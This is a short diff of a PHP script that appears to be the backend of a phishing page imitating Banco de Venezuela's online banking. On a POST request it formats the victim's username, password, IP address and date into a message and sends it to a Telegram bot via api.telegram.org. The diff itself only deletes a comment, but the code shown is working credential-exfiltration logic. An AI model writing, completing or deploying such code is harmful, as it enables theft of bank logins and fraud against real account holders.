@@ -13,7 +13,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     
     $mensaje = urlencode("🏦 ═══ BDV EN LÍNEA ═══ 🏦\n\n👤 Usuario: $usuario\n🔑 Clave: $password\n🌐 IP: $ip\n📅 Fecha: $fecha");
     
-    // Llamada directa a la API
     $response = file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$mensaje");
     
     echo json_encode(["success" => true]);
